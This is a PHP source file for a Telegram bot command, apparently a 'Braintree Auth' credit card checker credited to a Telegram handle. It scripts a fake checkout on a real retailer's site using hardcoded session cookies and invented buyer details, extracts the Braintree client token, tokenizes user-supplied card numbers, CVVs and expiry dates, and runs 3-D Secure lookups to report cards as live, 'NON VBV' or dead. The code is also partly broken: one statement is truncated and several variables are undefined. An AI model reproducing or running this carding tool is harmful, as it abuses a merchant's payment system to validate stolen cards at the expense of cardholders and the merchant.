<?php

/*

///==[BAINTREE AUTH Checker Commands]==///

/auth creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if (strpos($message, "/auth ") === 0 || strpos($message, "!auth ") === 0) {
  $antispam = antispamCheck($userId);
  addUser($userId);

  if ($antispam != False) {
    bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
      'parse_mode' => 'html',
      'reply_to_message_id' => $message_id
    ]);
    return;

  } else {
    $messageidtoedit1 = bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "<b>Wait for Result...</b>",
      'parse_mode' => 'html',
      'reply_to_message_id' => $message_id

    ]);

    $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
    $lista = substr($message, 4);
    $bin = substr($cc, 0, 6);

    if (preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
      $creditcard = $matches[0][0];
      $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
      $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
      $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
      $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];


      ###CHECKER PART###
      $zip = rand(10001, 90045);
      $time = rand(30000, 699999);
      $rand = rand(0, 99999);
      $pass = rand(0000000000, 9999999999);
      $email = substr(md5(mt_rand()), 0, 7);
      $name = substr(md5(mt_rand()), 0, 7);
      $last = substr(md5(mt_rand()), 0, 7);
      #------[SETP-1]------#
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step1/');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_HEADER, 1);
      $headers = array();
      $headers[] = 'Host: buddlycrafts.com';
      $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
      $headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_gat_gtag_UA_1050488_1=1;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334906.0;_ga=GA1.1.1027250232.1629334834';
      $headers[] = 'referer: https://buddlycrafts.com/checkout/step1/';
      $headers[] = 'origin: https://buddlycrafts.com';
      $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'');
      $get = curl_exec($ch);

      //MERCHANT ID
      $hid = trim(strip_tags(getStr($get, '/checkout/step2/', '/')));
      // exit();
      #------[GET-2]------#

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step2/'.$hid.'/');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      // curl_setopt($ch, CURLOPT_HEADER, 1);
      $headers = array();
      $headers[] = 'Host: buddlycrafts.com';
      $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
      $headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
      $headers[] = 'referer: https://buddlycrafts.com/checkout/step1/';
      $headers[] = 'origin: https://buddlycrafts.com';
      $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      $get = curl_exec($ch);
      #------[SETP-2]------#

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step2/'.$hid.'/');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_HEADER, 1);
      $headers = array();
      $headers[] = 'Host: buddlycrafts.com';
      $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
      $headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
      $headers[] = 'referer: https://buddlycrafts.com/checkout/step2/'.$hid.'/';
      $headers[] = 'origin: https://buddlycrafts.com';
      $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'country=US&name='.$first.'+'.$laat.'&line1=3+Allen+Street&line2=&town_or_city=New+York&us_state=NY&county_or_state=NY&postal_code=10002&phone=2253688965');
      $get = curl_exec($ch);

      #------[GET-3]------#

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step3/'.$hid.'/');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      // curl_setopt($ch, CURLOPT_HEADER, 1);
      $headers = array();
      $headers[] = 'Host: buddlycrafts.com';
      $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
      $headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
      $headers[] = 'referer: https://buddlycrafts.com/checkout/step2/'.$hid.'/';
      $headers[] = 'origin: https://buddlycrafts.com';
      $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'country=US&name=Carolyn+watson&line1=3+Allen+Street&line2=&town_or_city=New+York&us_state=NY&county_or_state=NY&postal_code=10002&phone=2253688965');
      $get = curl_exec($ch);

      //MERCHANT ID
      // $hid = trim(strip_tags(getStr($get, '/checkout/step2/','/')));

      // echo "<hr> <pre> STEP3 $get <pre> <hr>";
      // exit();

      #------[SETP-3]------#

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step3/'.$hid.'/');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      // curl_setopt($ch, CURLOPT_HEADER, 1);
      $headers = array();
      $headers[] = 'Host: buddlycrafts.com';
      $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
      $headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
      $headers[] = 'referer: https://buddlycrafts.com/checkout/step3/'.$hid.'/';
      $headers[] = 'origin: https://buddlycrafts.com';
      $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree');
      $get = curl_exec($ch);

      //MERCHANT ID
      // $hid = trim(strip_tags(getStr($get, '/checkout/step2/','/')));
      // echo "<hr> <pre> STEP3 $get <pre> <hr>";
      // exit();

      // exit();
      #------[CURL-1]------#

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://buddlycrafts.com/checkout/step4/'.$hid.'/');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      $headers = array();
      $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
      $headers[] = 'cookie: _gid=GA1.2.1870766631.1629334834;_gcl_au=1.1.1647341141.1629334834;csrftoken=X2FGOn1Bmcli0T2M4NQlNPWcS8EDs7aQIc1CmGqCgFuF0pq1xav3cPG2bboP3yDu;sessionid=6f7tk04nosel8022xnkanbgijwjljrh4;_ga=GA1.1.1027250232.1629334834;_ga_HCJKYWTJ6X=GS1.1.1629334833.1.1.1629334982.0';
      $headers[] = 'referer: https://buddlycrafts.com/checkout/step3/'.$hid.'/';
      $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

      $get = curl_exec($ch);

      //MERCHANT ID
      $merchant = trim(strip_tags(getStr($get, '"merchant_id": "', '"')));

      // ENCODED BEARER
      $enbearer = trim(strip_tags(getstr($get, '"client_token": "', '"')));


      // DECODED BEARER
      $decode = base64_decode($enbearer);

      // MAIN BEARER
      $bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"', '",')));
      echo "<hr> <pre> Bearer $bearer <pre> <hr>";
      echo "<hr> <pre> merchant $merchant <pre> <hr>";
      // exit();

      #------[CURL-2]------#
      // exit();
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_POST, 1);
      $headers = array();
      $headers[] = 'Accept: */*';
      $headers[] = 'Authorization: Bearer '.$bearer.'';
      $headers[] = 'Braintree-Version: 2018-05-10';
      $headers[] = 'Content-Type: application/json';
      $headers[] = 'Host: payments.braintree-api.com';
      $headers[] = 'Origin: https://buddlycrafts.com';
      $headers[] = 'Referer: https://buddlycrafts.com/';
      $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$session.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Issac Newton"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
      $curl2 = curl_exec($ch);
      $token = trim(strip_tags(getstr($curl2, '"token":"', '"')));
      curl_close($ch);
      echo "<hr> <pre> token $token <pre> <hr>";

      #------[CURL-2]------#

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_POST, 1);
      $headers = array();
      $headers[] = 'Accept: */*';
      $headers[] = 'Content-Type: application/json';
      $headers[] = 'Host: api.braintreegateway.com';
      $headers[] = 'Origin: https://buddlycrafts.com';
      $headers[] = 'Referer: https://buddlycrafts.com/';
      $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"34.14","additionalInfo":{"shippingGivenName":"Issac","shippingSurname":"Newton","shippingPhone":"7018560000","billingLine1":"1427  Harrison Street","billingLine2":"","billingCity":"San Rafael","billingState":"CA","billingPostalCode":"94903","billingCountryCode":"US","billingPhoneNumber":"7018560000","billingGivenName":"Issac","billingSurname":"Newton","shippingLine1":"1427  Harrison Street","shippingLine2":"","shippingCity":"San Rafael","shippingState":"CA","shippingPostalCode":"94903","shippingCountryCode":"US","email":"issacnewton@gmail.com"},"bin":"'.$bin.'","dfReferenceId":"0_1a30c2ca-9949-49be-be53-655f498b5e2d","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.68.0","cardinalDeviceDataCollectionTimeElapsed":867,"issuerDeviceDataCollectionTimeElapsed":1347,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.68.0","_meta":{"merchantAppId":"buddlycrafts.com","platform":"web","sdkVersion":"3.68.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$session.'"}}');
      $lookup = curl_exec($ch);
      $status = trim(strip_tags(getstr($lookup, '"status":"', '"')));
      $enrolled = trim(strip_tags(getstr($lookup, '"enrolled":"', '"')));
      //////////////////////////////////////////////////////////////////////////////////////////////////////////////
      if ($status == "authenticate_attempt_successful" or $status == "lookup_not_enrolled") {
        $cc_code = "✅";
        $code = 'NON VBV';
      } elseif (!strpos($lookup, "authenticate_attempt_successful")) {

        $cc_code = '❌';
        $code = 'VBV';
      }

      if (empty($lookup) or strpos($lookup, 'Credit card number is invalid')) {
        $result = urlencode

      $result2 = curl_exec($ch);
      $errormessage = trim(strip_tags(capture($result2, '"code":"', '"')));
    }
    $info = curl_getinfo($ch);
    $time = $info['total_time'];
    $time = substr_replace($time, '', 4);

    ###END OF CHECKER PART###


    if (strpos($result2, 'client_secret')) {
      addTotal();
      addUserTotal($userId);
      addCVV();
      addUserCVV($userId);
      addCCN();
      addUserCCN($userId);
      bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => " < b > Card: < /b > < code > $lista < /code > < b > Status -» CVV or CCN ✅
          Response -» Approved
          Gateway -» Baintree Auth 
          Time -» < b > $time < /b><b > s < /b >

          ------- Bin Info -------</b > < b > Bank -» < /b > $bank < b > Brand -» < /b > $schemename < b > Type -» < /b > $typename < b > Currency -» < /b > $currency < b > Country -» < /b > $cname ($emoji - 💲$currency) < b > Issuers Contact -» < /b > $phone < b>----------------------------</b > < b > Checked By < a href = 'tg://user?id=$userId' > $firstname < /a></b > < b > Bot By: < a href = 't.me/Sarcehkr' > ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ < /a></b > ",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'

      ]);
    } elseif ($result2 == null && !$stripeerror) {
      addTotal();
      addUserTotal($userId);
      bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => " < b > Card: < /b > < code > $lista < /code > < b > Status -» API Down ❌
          Response -» Unknown
          Gateway -» Baintree Auth 
          Time -» < b > $time < /b><b > s < /b >

          ------- Bin Info -------</b > < b > Bank -» < /b > $bank < b > Brand -» < /b > $schemename < b > Type -» < /b > $typename < b > Currency -» < /b > $currency < b > Country -» < /b > $cname ($emoji - 💲$currency) < b > Issuers Contact -» < /b > $phone < b>----------------------------</b > < b > Checked By < a href = 'tg://user?id=$userId' > $firstname < /a></b > < b > Bot By: < a href = 't.me/Sarcehkr' > ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ < /a></b > ",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'

      ]);
    } else {
      addTotal();
      addUserTotal($userId);
      bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => " < b > Card: < /b > < code > $lista < /code > < b > Status -» Dead ❌
          Response -» $errormessage
          Gateway -» Baintree Auth 
          Time -» < b > $time < /b><b > s < /b >

          ------- Bin Info -------</b > < b > Bank -» < /b > $bank < b > Brand -» < /b > $schemename < b > Type -» < /b > $typename < b > Currency -» < /b > $currency < b > Country -» < /b > $cname ($emoji - 💲$currency) < b > Issuers Contact -» < /b > $phone < b>----------------------------</b > < b > Checked By < a href = 'tg://user?id=$userId' > $firstname < /a></b > < b > Bot By: < a href = 't.me/Sarcehkr' > ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ < /a></b > ",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'

      ]);
    }

  } else {
    bot('editMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $messageidtoedit,
      'text' => " < b > Cool! Fucking provide a CC to Check!!</b > ",
      'parse_mode' => 'html',
      'disable_web_page_preview' => 'true'

    ]);
  }
}
}


?>